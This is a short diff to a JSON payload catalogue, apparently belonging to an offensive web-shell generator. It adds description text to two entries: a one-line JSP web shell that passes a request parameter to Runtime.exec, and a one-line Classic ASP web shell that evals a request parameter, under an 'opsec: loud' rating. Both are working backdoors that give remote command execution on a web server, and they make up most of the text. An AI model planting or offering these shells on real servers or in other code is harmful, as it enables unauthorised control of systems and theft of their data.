@@ -64,11 +64,13 @@
   "variations": [
     {
       "label": "JSP",
-      "command": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+      "command": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+      "description": "Web shell payload that executes operating system commands through a web request. Provides command execution on the web server via a simple HTTP parameter."
     },
     {
       "label": "ASP",
-      "command": "<% eval request(\"cmd\") %>"
+      "command": "<% eval request(\"cmd\") %>",
+      "description": "Classic ASP web shell that executes arbitrary commands passed via HTTP request parameters. One-line backdoor for IIS servers running Classic ASP."
     }
   ],
   "opsec": "loud",
